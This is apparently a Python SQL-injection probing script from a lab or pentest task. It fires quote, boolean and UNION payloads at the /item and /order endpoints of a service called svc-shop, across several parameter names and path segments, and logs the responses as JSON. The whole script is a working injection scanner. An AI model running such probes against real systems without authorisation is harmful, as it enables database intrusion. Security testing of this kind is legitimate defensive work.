#!/usr/bin/env python3
# INT-r27-0011: svc-shop SQLi 错误回显验证 (/item /order)
# 参数名族全试 + 载荷阶梯 + 路径形；判据=响应体差异（错误文本/布尔分化/UNION 回显）
import http.client, json, time, urllib.parse

HOST, PORT = "svc-shop", 8001
PARAMS = ["id", "q", "key", "name", "item_id", "order_id"]
PAYLOADS = [
    ("p1-base", "1"),
    ("p2-quote", "1'"),
    ("p3-bool-true", "1' AND '1'='1"),
    ("p4-bool-false", "1' AND '1'='2"),
    ("p5-union", "1 UNION SELECT 1--"),
]
PATHS = ["/item", "/order"]

def send(path_query):
    c = http.client.HTTPConnection(HOST, PORT, timeout=8)
    c.request("GET", path_query, headers={"Host": "svc-shop:8001", "Connection": "close"})
    r = c.getresponse()
    body = r.read().decode("utf-8", "replace")
    hdrs = dict(r.getheaders())
    st = r.status
    c.close()
    return st, hdrs, body

results = []
for p in PATHS:
    time.sleep(0.25)
    try:
        s, h, b = send(p)
        results.append({"path": p, "query": None, "param": "(bare)", "payload_tag": "bare", "payload": None,
                        "raw_request": "GET %s HTTP/1.1\r\nHost: svc-shop:8001\r\n\r\n" % p,
                        "status": s, "headers": h, "body": b})
    except Exception as e:
        results.append({"path": p, "param": "(bare)", "payload_tag": "bare", "error": repr(e)})

for p in PATHS:
    for prm in PARAMS:
        for tag, pl in PAYLOADS:
            q = prm + "=" + urllib.parse.quote(pl, safe="")
            tgt = p + "?" + q
            time.sleep(0.25)
            try:
                s, h, b = send(tgt)
                results.append({"path": p, "query": q, "param": prm, "payload_tag": tag, "payload": pl,
                                "raw_request": "GET %s HTTP/1.1\r\nHost: svc-shop:8001\r\n\r\n" % tgt,
                                "status": s, "headers": h, "body": b})
            except Exception as e:
                results.append({"path": p, "query": q, "param": prm, "payload_tag": tag, "payload": pl, "error": repr(e)})

for p in PATHS:
    for tag, pl in [("path1", "1"), ("path2", "1'")]:
        tgt = p + "/" + urllib.parse.quote(pl, safe="")
        time.sleep(0.25)
        try:
            s, h, b = send(tgt)
            results.append({"path": p, "query": None, "param": "(path)", "payload_tag": tag, "payload": pl,
                            "raw_request": "GET %s HTTP/1.1\r\nHost: svc-shop:8001\r\n\r\n" % tgt,
                            "status": s, "headers": h, "body": b})
        except Exception as e:
            results.append({"path": p, "param": "(path)", "payload_tag": tag, "payload": pl, "error": repr(e)})

print(json.dumps({"intent": "INT-r27-0011", "target": "http://svc-shop:8001",
                  "count": len(results), "results": results}, ensure_ascii=False))
